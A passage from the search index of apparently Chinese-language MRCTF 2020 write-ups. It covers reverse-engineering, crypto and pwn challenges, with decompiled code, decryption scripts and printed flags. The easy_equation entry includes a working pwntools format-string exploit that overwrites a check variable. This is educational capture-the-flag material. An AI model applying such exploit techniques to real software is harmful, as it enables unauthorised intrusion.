\u7531\u6b64\u53ef\u4ee5\u63a8\u6d4b\u51fa\u5b83\u7684\u4f20\u53c2\u89c4\u5f8b \u90a3\u4e2a\u505a\u51fa\u6765\u7684\u5e08\u5085\u662f\u76f4\u63a5\u627e\u7684\u5b57\u7b26\u4e32\u6bd4\u8f83\u4f4d\u7f6e\u628aflag\u89e3\u51fa\u6765\u7684\uff0c\u8fd9\u4e2a...\u55ef..\u7b97\u662f\u975e\u9884\u671f\uff0c\u4e5f\u662f\u6211\u5927\u610f\u4e86\uff0c\u6211\u662f\u60f3\u8ba9\u5927\u5bb6\u53bb\u9006move\u8fd9\u4e2a\u51fd\u6570\u903b\u8f91\u7684\u3002 \u601d\u8def1(\u5b98\u65b9\u89e3\u6cd5): \u7b80\u5355\u770b\u4e00\u4e0bmove\u51fd\u6570\u903b\u8f91\uff0c\u5f80\u4e0b\u4e00\u7ffb\u53d1\u73b0\u662f\u9012\u5f52\uff0c\u518d\u770b\u9012\u5f52\u7684\u51fd\u6570\u8c03\u7528 \u6839\u636eGolang\u81ea\u5df1\u7684\u6570\u636e\u7ed3\u6784(\u8fd9\u4e2a\u6211\u5c31\u6ca1\u591a\u7814\u7a76\u4e86)\u53ef\u4ee5\u63a8\u65ad\u63a5\u4e0b\u6765\u8981\u6267\u884c\u7684\u51fd\u6570 move(arg0-1,arg1,arg3,arg2) move(arg0-1,arg2,arg1,arg3) \u53c8\u901a\u8fc7main\u4e2d\u8c03\u7528\u60c5\u51b5\u63a8\u65ad\u662f\u6c49\u8bfa\u5854\uff0c\u5230\u7f51\u4e0a\u6284\u4e00\u4e2a\u6c49\u8bfa\u5854\u4e0b\u6765\u7f16\u8bd1\u4e00\u4e0b\u9a8c\u8bc1\u4e00\u4e0b\u5c31\u8fc7\u4e86 \u601d\u8def2(\u975e\u9884\u671f): \u901a\u8fc7\u8fd9\u4e2acompare\u53cd\u7740\u4e0b\u624b \u901a\u8fc7\u5206\u6790\u903b\u8f91\u53d1\u73b0\uff0cflag\u88abrc4\u52a0\u5bc6\u540e\u4e0e\u52a0\u5bc6\u540e\u7684\u8f93\u5165\u8fdb\u884c\u6bd4\u8f83\uff0c\u90a3\u6211\u4eec\u83b7\u5f97\u52a0\u5bc6\u540e\u7684\u6570\u636e\u518d\u89e3\u5bc6\u4e0d\u5c31\u62ff\u5230flag\u4e86 \u501f\u4e2a\u5e08\u5085\u7684 wp\u4ee3\u7801 ( lingze\u5e08\u5085\u7684wp \u4e5f\u5f88ok) package main import ( \"crypto/rc4\" \"fmt\" \"strconv\" ) func Hextob(str string)([]byte){ slen:=len(str) bHex:=make([]byte,len(str)/2) ii:=0 for i:=0;i<len(str);i=i+2 { if slen!=1{ ss:=string(str[i])+string(str[i+1]) bt,_:=strconv.ParseInt(ss,16,32) bHex[ii]=byte(bt) ii=ii+1; slen=slen-2;} } return bHex; } func BytetoH(b []byte)(H string){ H=fmt.Sprintf(\"%x\",b) return; } func main() { var key []byte = []byte(\"MRCTF_GOGOGO\") //\u521d\u59cb\u5316\u7528\u4e8e\u52a0\u5bc6\u7684KEY rc4obj1, _ := rc4.NewCipher(key) //\u8fd4\u56de Cipher rc4str1 := []byte(\"AAAABBBB\") //\u9700\u8981\u52a0\u5bc6\u7684\u5b57\u7b26\u4e32 plaintext := make([]byte, len(rc4str1)) // rc4obj1.XORKeyStream(plaintext, rc4str1) stringinf1 := fmt.Sprintf(\"%x\\n\", plaintext) //\u8f6c\u6362\u5b57\u7b26\u4e32 fmt.Println(\"\u52a0\u5bc6\u540e:\"+stringinf1) var stringa=BytetoH(plaintext) fmt.Println(\"bytetohex:\"+stringa) var stringb=Hextob(\"7d306ec9cc03931e854d455fc546f4a8a03e11be70751da3cd7fffbd8112\") rc4obj2, _ := rc4.NewCipher(key) //\u8fd4\u56de Cipher rc4obj2.XORKeyStream(stringb, stringb) stringinf2 := fmt.Sprintf(\"%s\\n\", stringb) //\u8f6c\u6362\u5b57\u7b26\u4e32","title":"hard_to_go"},{"location":"writeup/MRCTF-2020/#pixelshooter","text":"\u8fd9\u9053\u9898\u76ee\u4f7f\u7528\u4e86Unity\u5199\u7684\u4e2a\u5c0f\u6e38\u620f \u8868\u9762\u4e0a\u662fapk\uff0c\u5176\u5b9e\u662f\u4e2aC#\u9006\u5411 \u5927\u90e8\u5206\u7684Unity\u90fd\u662f\u7528C#\u5199\u7684\uff0c\u5176\u4e2d\u6709\u4e2a\u5b58\u50a8\u903b\u8f91\u4ee3\u7801\u7684C#\u4e8c\u8fdb\u5236\u6587\u4ef6 Assembly-Csharp.dll \u6240\u4ee5\u53ea\u8981\u627e\u5230\u8fd9\u4e2a\u73a9\u610f\u5c31\u662f\u4e86 apk\u89e3\u5305\uff0cPixelShooter.apk\\assets\\bin\\Data\\Managed\u4e0b\u9762\u5c31\u662f\u4e86 dnspy\u6253\u5f00 \u5373\u53ef\u5728UIController\u4e0b\u627e\u5230flag MRCTF{Unity_1S_Fun_233}","title":"PixelShooter"},{"location":"writeup/MRCTF-2020/#junk","text":"\u8fd9\u9053\u9898\u5982\u540c\u5176\u540d\u5b57\uff0cJunk \u5f80\u91cc\u9762\u585e\u4e86\u5f88\u591aJunkCode\uff0c\u53ea\u8981\u4e00\u4e2a\u4e2a\u53bb\u6389\u5c31\u662f\u4e86\uff0cU\u548cC\u952e\u4ea4\u66ff(\u91cc\u9762\u63d2\u4e86\u8bb8\u591a0xE8\u5b57\u8282\u6765\u8ff7\u60d1IDA) \u987a\u4fbf\u628a\u4e00\u4e9b\u7a00\u91cc\u7cca\u6d82\u7684Call\u7ed9\u5220\u4e86(\u901a\u8fc7Call\u4e00\u4e2a\u51fd\u6570\uff0c\u51fd\u6570\u91cc\u4fee\u6539\u4e86EIP\u7684\u503c\uff0c\u8fdb\u884c\u8df3\u8f6c\uff0c\u8fd9\u4f1a\u5bfc\u81f4F5\u5206\u6790\u5931\u8d25) \u53ef\u4ee5\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b\uff0c\u8fd9\u91cc\u5bf9\u8f93\u5165\u8fdb\u884c\u4e86\u5f02\u6216 \u7136\u540e\u5b9e\u73b0\u4e86\u5faa\u73af\u5de6\u79fb\u548c\u53f3\u79fb\u7684\u64cd\u4f5c\uff0c\u9274\u4e8e\u4f4d\u79fb\u56db\u4f4d\uff0c\u5176\u5b9e\u5de6\u79fb\u53f3\u79fb\u90fd\u662f\u4e00\u6837\u7684 \u8fd9\u91cc\u8fd8\u6709\u4e2a\u5947\u602a\u7684\u51fd\u6570sub_B81090\uff0c\u5bf9\u6570\u636e\u8fdb\u884c\u4e86\u5947\u602a\u7684\u64cd\u4f5c \u70b9\u5f00\u770b\u770b char __fastcall sub_B81090(char *a1, int a2) { int v2; // eax signed int v3; // esi int v4; // edi char v5; // al unsigned __int8 v6; // ah unsigned __int8 v7; // dh unsigned __int8 v8; // bh unsigned __int8 v9; // dl signed int v10; // eax bool v11; // cf unsigned __int8 v12; // cl int i; // ecx int v15; // [esp+8h] [ebp-14h] char v16; // [esp+10h] [ebp-Ch] char v17; // [esp+11h] [ebp-Bh] char v18; // [esp+12h] [ebp-Ah] char v19; // [esp+13h] [ebp-9h] unsigned __int8 v20; // [esp+14h] [ebp-8h] unsigned __int8 v21; // [esp+15h] [ebp-7h] unsigned __int8 v22; // [esp+16h] [ebp-6h] unsigned __int8 v23; // [esp+1Bh] [ebp-1h] v2 = a2; v3 = 0; v4 = 0; if ( a2 ) { do { v15 = v2 - 1; v5 = *a1++; *(&v20 + v3++) = v5; v6 = v22; v7 = v21; v8 = v20; v23 = v22; if ( v3 == 3 ) { v9 = (v22 >> 6) + 4 * (v21 & 0xF); v17 = (v21 >> 4) + 16 * (v20 & 3); v18 = (v22 >> 6) + 4 * (v21 & 0xF); v19 = v22 & 0x3F; v16 = v20 >> 2; byte_BA1708[v4] = byte_B9EA00[v20 >> 2]; byte_BA1709[v4] = byte_B9EA00[(unsigned __int8)((v7 >> 4) + 16 * (v8 & 3))]; byte_BA170A[v4] = byte_B9EA00[v9]; byte_BA170B[v4] = byte_B9EA00[v6 & 0x3F]; v4 += 4; v3 = 0; } v2 = v15; } while ( v15 ); if ( v3 ) { v10 = v3; if ( v3 >= 3 ) { v12 = v23; } else { v11 = (unsigned int)v3 < 3; do { if ( !v11 ) { sub_B8150A(a1); JUMPOUT(*(_DWORD *)algn_B811F3); } *(&v20 + v10++) = 0; v11 = (unsigned int)v10 < 3; } while ( v10 < 3 ); v12 = v22; v7 = v21; v8 = v20; } v16 = v8 >> 2; v17 = (v7 >> 4) + 16 * (v8 & 3); LOBYTE(v2) = v12 >> 6; v19 = v12 & 0x3F; v18 = (v12 >> 6) + 4 * (v7 & 0xF); for ( i = 0; i < v3 + 1; ++v4 ) { v2 = (unsigned __int8)*(&v16 + i++); LOBYTE(v2) = byte_B9EA00[v2]; byte_BA1708[v4] = v2; } if ( v3 < 3 ) LOBYTE(v2) = sub_B822E0(&byte_BA1708[v4], 46, 3 - v3); } } return v2; } \u4e0d\u96be\u53d1\u73b0\u5c31\u662f\u4e2abase64\u53d8\u79cd\uff0c\u4e0d\u8fc7\u5c31\u662f\u628a\u8868\u6362\u4e86\u4e00\u4e0b\uff0c\u7b49\u4e8e\u53f7\u6362\u6210\u70b9\u800c\u5df2 ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz)!@#$%^&*(+/ \u6700\u540e\u5728\u548c\u5df2\u6709\u5b57\u7b26\u4e32\u6bd4\u8f83 \u6240\u4ee5\u601d\u8def\u5f88\u7b80\u5355: \u89e3\u53d8\u79cdbase64->\u5faa\u73af\u5de6\u79fb4\u4f4d->\u5f02\u62163->\u5f97\u5230flag EXP import base64 orig=\"%BUEdVSHlmfWhpZn!oaWZ(aGBsZ@ZpZn!oaWZ(aGBsZ@ZpZn!oYGxnZm%w..\" orig=orig.replace(')','0') orig=orig.replace('!','1') orig=orig.replace('@','2') orig=orig.replace('#','3') orig=orig.replace('$','4') orig=orig.replace('%','5') orig=orig.replace('^','6') orig=orig.replace('&','7') orig=orig.replace('*','8') orig=orig.replace('(','9') orig=orig.replace('.','=') print orig code=base64.b64decode(orig).encode('hex') flag=\"\" for x in range(0,len(code),2): num=int(code[x:x+2],16) num=(((num>>4)&0xff) | ((num<<4)&0xff)) flag+=chr(num^3) print flag MRCTF{junkjunkjunkcodejunkjunkcodejunkcode}","title":"Junk"},{"location":"writeup/MRCTF-2020/#easycpp","text":"\u7a0b\u5e8f\u8fd0\u7528\u4e86\u8f83\u591a\u7684C++\u7279\u6027 \u6240\u4ee5\u4ee3\u7801\u770b\u8d77\u6765\u4f1a\u6bd4\u8f83\u5197\u6742\uff0c\u597d\u5728\u7ed9\u4e86\u7b26\u53f7 \u603b\u4f53\u4e0a\u662f\u8981\u8f93\u51659\u4e2a\u6570\u5b57\uff0c\u5e76\u5b58\u5165\u4e86Vector \u7136\u540e\u901a\u8fc7lambda\u8868\u8fbe\u5f0f\u8fdb\u884c\u4e86\u6bcf\u4e2a\u6570\u5b57\u5f02\u62161\u7684\u64cd\u4f5c\uff0c\u7136\u540e\u5bf9\u7ed3\u679c\u8c03\u7528\u4e86\u4e2adepart\u7684\u51fd\u6570 \u5f97\u5230\u4e00\u4e2astring\u7684\u7ed3\u679c\uff0c\u6700\u540e\u548c\u539f\u6709\u76849\u4e2a\u5947\u602a\u5b57\u7b26\u4e32\u6bd4\u8f83 \u6700\u540e\u8f93\u51fa\u4e5d\u4e2a\u6570\u5b57\u62fc\u8d77\u6765\u7684\u5b57\u7b26\u4e32\uff0cflag\u5c31\u662f\u8981\u628a\u8fd9\u4e5d\u4e2a\u6570\u5b57\u62fc\u8d77\u6765\u8fdb\u884cmd5\u6821\u9a8c\u540e\u5305\u8d77\u6765 \u7136\u540e\u6765\u5206\u6790\u4e0bdepart\u51fd\u6570\u548c\u90a3\u4e2a\u8d1f\u8d23\u66ff\u6362\u7684lambda\u8868\u8fbe\u5f0f __int64 __fastcall depart(int a1, __int64 a2, double a3) { char v4; // [rsp+20h] [rbp-60h] char v5; // [rsp+40h] [rbp-40h] int i; // [rsp+68h] [rbp-18h] int v7; // [rsp+6Ch] [rbp-14h] v7 = a1; for ( i = 2; ; ++i ) { std::sqrt<int>((unsigned int)a1); //\u679a\u4e3e\u5230\u6839\u53f7n if ( a3 < (double)i ) break; if ( !(a1 % i) ) //\u80fd\u5206\u89e3\u5c31\u5206\u89e3 { v7 = i; depart((unsigned int)(a1 / i), a2); //\u9012\u5f52\u5206\u89e3 break; } } std::__cxx11::to_string((std::__cxx11 *)&v5, v7); //\u5c06\u6570\u5b57\u8f6c\u4e3a\u5b57\u7b26\u4e32\u4ee5\u7a7a\u683c\u4e3a\u95f4\u9694\u7b26\u5408\u5e76\u8d77\u6765 std::operator+<char,std::char_traits<char>,std::allocator<char>>(&v4, &unk_500C, &v5); std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator+=(a2, &v4); std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(&v4); return std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(&v5); } \u6700\u540e\u90a3\u4e2a\u6bd4\u8f83\u51fd\u6570\u5176\u5b9e\u5c31\u662f replace(a.begin(),a.end(),'0','O'); replace(a.begin(),a.end(),'1','l'); replace(a.begin(),a.end(),'2','z'); replace(a.begin(),a.end(),'3','E'); replace(a.begin(),a.end(),'4','A'); replace(a.begin(),a.end(),'5','s'); replace(a.begin(),a.end(),'6','G'); replace(a.begin(),a.end(),'7','T'); replace(a.begin(),a.end(),'8','B'); replace(a.begin(),a.end(),'9','q'); replace(a.begin(),a.end(),' ','='); \u5c06\u8fd9\u4e9b\u4e1c\u897f\u66ff\u6362\u56de\u6570\u5b57\uff0c\u518d\u628a\u8fd9\u4e9b\u6570\u5b57\u4e58\u8d77\u6765\uff0c\u518d\u5f02\u62161\u4e00\u4e0b\u5c31\u662f\u8f93\u5165\u7684\u4e5d\u4e2a\u6570\u5b57 2345 1222 5774 2476 3374 9032 2456 3531 6720 MRCTF{4367FB5F42C6E46B2AF79BF409FB84D3}","title":"EasyCPP"},{"location":"writeup/MRCTF-2020/#shit","text":"\u8fd9\u9053\u9898\u76ee\u662f\u4e34\u65f6\u51fa\u7684\uff0c\u5176\u5b9e\u53ea\u8981\u8fc7\u6389\u5f00\u5c40\u7684\u4e00\u4e2a\u6b7b\u5faa\u73af\uff0c\u4e5f\u53ef\u4ee5attach\uff0c\u7136\u540edump\u51fa\u5bc6\u94a5 \u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u89e3\u5bc6\u4e86\uff0c\u89e3\u5bc6\u7b97\u6cd5\u5176\u5b9e\u5c31\u662f\u52a0\u5bc6\u7b97\u6cd5\u7684\u9006\u5411\u8fc7\u7a0b\uff0c\u5168\u662f\u4f4d\u8fd0\u7b97 //key\u5c31\u662f\u5bc6\u94a5 \u8bf7\u76f4\u63a5dump unsigned int ks[6]={0x8c2c133a,0xf74cb3f6,0xfedfa6f2,0xab293e3b,0x26cf8a2a,0x88a1f279}; void decode() { unsigned int k=0,bk=0; for(int i=5;i>=0;i--) if(i>0) ks[i]^=ks[i-1]; for(int i=0;i<24;i+=4) { k=ks[i/4]; k=(1<<key[i/4])^k; k=((k>>16)) | ((~(k<<16))&0xffff0000); k=((k<<key[i/4])) | (k>>(32-key[i/4])); printf(\"%X\\n\",k); } } \u89e3\u5bc6\u51fa\u516d\u4e2aint\uff0c\u76f4\u63a5\u8f6cascii\u5c31\u662fflag","title":"Shit"},{"location":"writeup/MRCTF-2020/#virtual-tree","text":"\u8fd9\u9053\u9898\u9759\u6001\u5206\u6790\u5b8c\u5168\u5c31\u662f\u9519\u7684\uff0c\u56e0\u4e3a\u6211\u5728main\u51fd\u6570\u8fd0\u884c\u524d\u4f1a\u5c06\u4e00\u4e9b\u51fd\u6570\u7ed9\u66ff\u6362\u6389 \u6240\u4ee5\u9759\u6001\u5206\u6790\u5b8c\u5168\u5931\u8d25\u7684\uff0c\u4f46\u662f\u4f3c\u4e4e\u5927\u90e8\u5206\u4eba\u90fd\u662f\u52a8\u8c032333 int replace() //\u5f00\u5c40\u66ff\u6362\u51fd\u6570\u4ee3\u7801\uff0c { void *addr=doit; int val=(int)addr; DWORD old; if(VirtualProtect(addr,512,PAGE_EXECUTE_READWRITE,&old)==NULL) exit(0); int count=0; while(*((PBYTE)val)!=0x90) { if(*((PDWORD)val)==0x00401510) *((PDWORD)val)=(DWORD)list[count++]; //\u5c06\u4e00\u4e2a\u5168\u662f\u540c\u4e00\u4e2acall\u7684\u51fd\u6570\u66ff\u6362\u6210\u4e0d\u4e00\u6837\u7684\u51fd\u6570 val=val+1; } addr=main; val=(int)addr; if(VirtualProtect(addr,512,PAGE_EXECUTE_READWRITE,&old)==NULL) exit(0); while(*((PBYTE)val)!=0x90) { if(*((PDWORD)val)==(DWORD)walkB) { *((PDWORD)val)=(DWORD)walkA; //\u52a0\u5bc6\u4ee3\u7801\u7684\u66ff\u6362 break; } val=val+1; } } \u6240\u4ee5\uff0c\u9700\u8981\u52a8\u8c03\u6765\u770b\u4ee3\u7801\uff0c\u4ee3\u7801\u624d\u662f\u5bf9\u7684\u3002\u3002 int sub_12F16F0() //\u5177\u4f53\u64cd\u4f5c\u5c31\u662f\u8fd9\u4e9b\u52a0\u51cf \u5f02\u6216 { Add(0, 10); Xor(1, 2); Add(2, 7); Sub_abs(3, 7); Xor(4, 5); Sub_abs(6, 1); Add(7, 3); Xor(8, 7); Sub_abs(9, 8); Sub_abs(10, 7); Xor(11, 12); Sub_abs(12, 2); Xor(14, 15); return Add(15, 2); } \u8fd8\u6709\u4e00\u4e2a\u51fd\u6570\u5bf9\u8f93\u5165\u8fdb\u884c\u4e86\u5f02\u6216\uff0cdump\u51fa\u6765\u5c31\u662f\u4e86\u3002\u3002 \u6240\u4ee5\u53ea\u9700\u8981\u5c06\u6570\u636e\u6309\u7167sub_12F16F0()\u89e3\u65b9\u7a0b\u4e4b\u540e\uff0c\u5728\u5f02\u6216dump\u51fa\u6765\u7684\u6570\u636e\u5c31\u53ef\u4ee5\u5f97\u5230flag\u4e86 @_7r3e_f0r_fuNN!","title":"Virtual Tree"},{"location":"writeup/MRCTF-2020/#crypto","text":"","title":"Crypto"},{"location":"writeup/MRCTF-2020/#keyboard","text":"\u5176\u5b9e\u5c31\u662f\u624b\u673a\u952e\u76d8 \u6bcf\u884c\u4ee3\u8868\u5f53\u4e2a\u6570\u5b57\u952e\u76d8\u4e0a\u7684\u5b57\u6bcd\u6441\u4e00\u6b21\u5c31\u662f\u7b2c\u4e00\u4e2a \u4ee5\u6b64\u7c7b\u63a8\u3002","title":"keyboard"},{"location":"writeup/MRCTF-2020/#_13","text":"\u67e5\u627e\u5230\u5929\u5e72\u5730\u652f\u56fe\uff0c\u53d1\u73b0\u6bcf\u4e2a\u90fd\u5bf9\u5e94\u7740\u6570\u5b57\uff0c\u7136\u540e\u7532\u5b50\u662f60\uff0c\u628a\u6bcf\u4e2a\u90fd\u52a0\u4e0a 60\u540e\u7528ascii\u7801\u8f6c\u4e0b\u5c31\u53ef\u4ee5\u4e86","title":"\u5929\u5e72\u5730\u652f+\u7532\u5b50"},{"location":"writeup/MRCTF-2020/#babyrsa","text":"\u8fd9\u9898\u672c\u8eab\u9664\u4e86RSA\u8003\u70b9\u5916\uff0c\u8fd8\u8003\u5bdf\u4e86\u6a21\u5e73\u65b9\u7b97\u6cd5\uff0c\u90a3\u4e2aQ\u5982\u679c\u786c\u603c\u662f\u603c\u4e0d\u51fa\u6765\u7684\uff0c\u5fc5\u987b\u6a21\u5e73\u65b9\uff0c\u81f3\u4e8e\u6a21\u5e73\u65b9\u7b97\u6cd5\u4ee3\u7801\u7f51\u4e0a\u86ee\u591a\uff0c\u6211\u8fd9\u5c31\u4e0d\u8d34\u4e86","title":"babyRSA"},{"location":"writeup/MRCTF-2020/#easy_rsa","text":"\u6bd4\u8f83\u5178\u578b\u7684RSA\u5957\u5a03\uff0c\u5206\u522b\u6c42\u51fap,q\uff0c\u5229\u7528\u9898\u5e72\u4e2d\u7684\u4e00\u4e9b\u51fd\u6570\u5373\u53ef\u6c42\u89e3\uff0c p\uff1a\u5df2\u77e5$\\phi(n)=(p-1)(q-1)$, $n=pq$\uff0c\u5229\u7528z3\u7684solve\u5bb9\u6613\u6c42\u89e3 q\uff1a\u5df2\u77e5$ed, n=pq$\uff0c\u53ef\u77e5$ed=k(p-1)(q-1)+1$\uff0c \u53c8\u7531\u4e8e$\\frac{ed-1}{n} \\leq k \\leq \\frac{ed-1}{2n}$ \u5229\u7528\u8fd9\u4e2a\u533a\u95f4\uff0c\u5faa\u73afsolve\u5373\u53ef\uff0cexp\u5982\u4e0b\uff1a import sympy from gmpy2 import invert from Crypto.Util.number import getPrime, long_to_bytes from z3 import * base = 65537 def gen_prime(N): while 1: A = getPrime(N) if A % 4 == 3: break return A def GET_P(n, F_n): p = Int('p') q = Int('q') expr = And(F_n == (p - 1) * (q - 1), n == p * q, p > 0, q > 0) solver = Solver() solver.add(expr) if solver.check() == sat: print(solver.model()) print(solver.model().eval(p)) print(print(solver.model().eval(q))) res_p = solver.model().eval(q).as_long() res_q = solver.model().eval(p).as_long() seed2 = 2021 * res_p + 2020 * res_q if seed2 < 0: seed2 = (-1) * seed2 return sympy.nextprime(seed2) def GET_Q(n, E_D ,judge): p = Int('p') q = Int('q') for k in range(judge, judge*2): expr = And(E_D - 1 == k * (p - 1) * (q - 1), n == p * q, p > 0, q > 0) solver = Solver() solver.add(expr) if solver.check() == sat: print(solver.model()) print(solver.model().eval(p)) print(print(solver.model().eval(q))) res_p = solver.model().eval(q).as_long() res_q = solver.model().eval(p).as_long() break seed2 = 2021 * res_p - 2020 * res_q if seed2 < 0: seed2 = (-1) * seed2 return sympy.nextprime(seed2) P_n = 14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199039812208100301939365080328518578704076769147484922508482686658959347725753762078590928561862163337382463252361958145933210306431342748775024336556028267742021320891681762543660468484018686865891073110757394154024833552558863671537491089957038648328973790692356014778420333896705595252711514117478072828880198506187667924020260600124717243067420876363980538994101929437978668709128652587073901337310278665778299513763593234951137512120572797739181693 P_F_n = 14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199039812208100301939365080328518578704076769147484922508482686658959347725753762078590928561862163337382463252361958145933210306431342748775024099427363967321110127562039879018616082926935567951378185280882426903064598376668106616694623540074057210432790309571018778281723710994930151635857933293394780142192586806292968028305922173313521186946635709194350912242693822450297748434301924950358561859804256788098033426537956252964976682327991427626735740 Q_n = 20714298338160449749545360743688018842877274054540852096459485283936802341271363766157976112525034004319938054034934880860956966585051684483662535780621673316774842614701726445870630109196016676725183412879870463432277629916669130494040403733295593655306104176367902352484367520262917943100467697540593925707162162616635533550262718808746254599456286578409187895171015796991910123804529825519519278388910483133813330902530160448972926096083990208243274548561238253002789474920730760001104048093295680593033327818821255300893423412192265814418546134015557579236219461780344469127987669565138930308525189944897421753947 Q_E_D = 100772079222298134586116156850742817855408127716962891929259868746672572602333918958075582671752493618259518286336122772703330183037221105058298653490794337885098499073583821832532798309513538383175233429533467348390389323225198805294950484802068148590902907221150968539067980432831310376368202773212266320112670699737501054831646286585142281419237572222713975646843555024731855688573834108711874406149540078253774349708158063055754932812675786123700768288048445326199880983717504538825498103789304873682191053050366806825802602658674268440844577955499368404019114913934477160428428662847012289516655310680119638600315228284298935201 Ciphertext = 40855937355228438525361161524441274634175356845950884889338630813182607485910094677909779126550263304194796000904384775495000943424070396334435810126536165332565417336797036611773382728344687175253081047586602838685027428292621557914514629024324794275772522013126464926990620140406412999485728750385876868115091735425577555027394033416643032644774339644654011686716639760512353355719065795222201167219831780961308225780478482467294410828543488412258764446494815238766185728454416691898859462532083437213793104823759147317613637881419787581920745151430394526712790608442960106537539121880514269830696341737507717448946962021 if __name__ == \"__main__\": judge = int(Q_E_D / Q_n) - 1 _E = base P = GET_P(P_n, P_F_n) Q = GET_Q(Q_n, Q_E_D, judge) _D = invert(_E, (P-1)*(Q-1)) M = pow(Ciphertext, _D, P*Q) flag = long_to_bytes(M) print(flag)","title":"easy_RSA"},{"location":"writeup/MRCTF-2020/#real_random","text":"\u5229\u7528\u4e86\u7ebf\u6027\u540c\u4f59\u6765\u6784\u9020\u4f2a\u968f\u673a\uff0c\u89c2\u5bdf\u53d1\u73b0b,c,m\u6ee1\u8db3\u6700\u5927\u5468\u671f\u6761\u4ef6\uff0c\u6545\u77e5\u6bcf\u6b21\u4ee5flag[t]\u4e3a\u79cd\u5b50\u751f\u6210\u7684\u968f\u673a\u6570\u5217\u7684\u5468\u671f\u5747\u4e3am\uff0c\u901a\u8fc7\u6cc4\u9732\u7684(p-1)*(q-1)\u53ef\u4ee5\u7b97\u51fam\uff0c\u7136\u540e\u51cf\u53bb$2^d$\uff08\u8bb0\u5f97\u53d6\u6a21\uff09\u5373\u53ef\u6c42\u89e3","title":"real_random"},{"location":"writeup/MRCTF-2020/#_14","text":"\u732a\u5708\u5bc6\u7801\uff0c\u5723\u5802\u6b66\u58eb\u5bc6\u7801\uff0c\u6807\u51c6\u94f6\u6cb3\u5b57\u6bcd\uff0c\u4e14\u5df2\u63d0\u793a\u90fd\u4e3a\u5927\u5199\u5b57\u6bcd \u89e3\u5bc6\u53ef\u5f97 FGCPFLIRTUASYON , \u56fe\u7247\u91cc\u4e5f\u63d0\u793a fence \uff0c\u6545\u5c1d\u8bd5\u6805\u680f\u5bc6\u7801 \u6bcf\u7ec4\u5b57\u6570\u4e3a3\u65f6\u5373\u53ef\u89e3\u5f97flag\uff1a MRCTF{CRYPTOFUN}","title":"\u53e4\u5178\u5bc6\u7801\u77e5\u591a\u5c11"},{"location":"writeup/MRCTF-2020/#pwn","text":"","title":"PWN"},{"location":"writeup/MRCTF-2020/#nothing_but_everything","text":"\u672c\u8eab\u662f\u7b80\u5355\u7684ROP\uff0c\u4f46\u662f\u6211\u9759\u6001\u7f16\u8bd1\u4e86\u4e00\u4e0b\u540e\uff0c\u53bb\u4e86\u7b26\u53f7\uff0c\u6240\u4ee5\u5982\u679c\u60f3\u770b\u7684\u6bd4\u8f83\u8f7b\u677e\uff0c\u9700\u8981\u53bb\u627e\u627eUbuntu\u4e0b\u7684sig\u6587\u4ef6\u7136\u540eida\u91cc\u5bfc\u5165\uff0c\u5c31\u53ef\u4ee5\u590d\u73b0\u4e0d\u5c11\u51fd\u6570\u7684\u6837\u5b50\u4e86\uff0c\u6216\u8005\u53ef\u4ee5\u7ed3\u5408\u52a8\u8c03\uff0c\u603b\u4e4b\u770b\u61c2\u9898\u5c31\u5f88\u7b80\u5355\u4e86\uff0c\u76f4\u63a5ROPgadget\u4e00\u628a\u68ad\u3002","title":"nothing_but_everything"},{"location":"writeup/MRCTF-2020/#easy_equation","text":"\uff08\u4e0b\u9762\u8bf4\u7684\u90fd\u6ca1\u7528\uff0c\u8fd9\u9898\u5fd8\u5173\u6ea2\u51fa\u4e86\uff0c\u76f4\u63a5\u6ea2\u51fa\u5c31\u884c \u5f88\u660e\u663e\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u6f0f\u6d1e\uff0c\u4f46\u662f\u5728\u5229\u7528\u4e0a\u9700\u8981\u4e00\u4e9b\u6280\u5de7\uff0c\u9996\u5148\u662f\u770b\u5230\u90a3\u4e2a\u516c\u5f0f\uff0c\u7528z3\u7684solve\u5f88\u597d\u7b97\u51fa\u6765\u89e3\u662f2\uff0c\u4e4b\u540e\u601d\u8def\u5c31\u5f88\u660e\u786e\uff0c\u5c06judge\u7684\u503c\u8986\u5199\u62102\u5373\u53ef\uff0c\u5982\u679c\u76f4\u63a5\u60f3\u8981\u76f4\u63a5\u7528fmstr_payload\u8fd9\u79cdpayload\u81ea\u52a8\u751f\u6210,\u4f1a\u60ca\u559c\u7684\u53d1\u73b0\uff0c\u65e0\u6cd5\u9760\u586b\u5145\u5b57\u7b26\u8fbe\u5230\u5730\u5740\u5bf9\u9f50\uff0c\u6240\u4ee5\u9700\u8981\u8f6c\u6362\u4e00\u4e0b\u601d\u8def\uff0c\u8003\u8651\u5230\u5730\u5740\u7684\u5c0f\u7aef\u5e8f\u5b58\u50a8\uff0c \u5982\u679c\u5728judge_addr-1\u7684\u4f4d\u7f6e\u5b58\u51650x200\uff0c\u90a3\u4e48judge_addr\u7684\u503c\u81ea\u7136\u4f1a\u53d8\u62100x02\uff0c\u4e8e\u662fexp\uff08\u4e0d\u662f\u552f\u4e00\u89e3\u6cd5\uff0c\u4e5f\u53ef\u4ee5\u6b63\u5411\u6784\u9020\uff09\u5982\u4e0b\uff1a from pwn import * p = process('easy_equation') judge_addr = 0x60105C payload = 'a' * 6 + '%' + str(0x200 - 6) + 'c%10$hn' payload += p64(judge_addr - 1) p.sendline(payload) p.interactive()","title":"easy_equation"},{"location":"writeup/MRCTF-2020/#spfa","text":"\u6709\u4e00\u4e2a\u660e\u663e\u7684get_flag\u51fd\u6570\uff0c\u53d1\u73b0\u6267\u884c\u8be5\u51fd\u6570\u7684\u6761\u4ef6\u662fflag!=-1\uff0c\u4f46\u662f\u7a0b\u5e8f\u5f00\u5934\u5df2\u7ecf\u5c06flag\u8d4b\u503c\u4e3a-1\uff0c\u5e76\u4e14\u7a0b\u5e8f\u5185\u5e76\u6ca1\u6709\u6d89\u53caflag\u7684\u8fd0\u7b97\uff0c\u4e8e\u662f\u8003\u8651\u901a\u8fc7\u6ea2\u51fa\u4fee\u6539flag\u3002 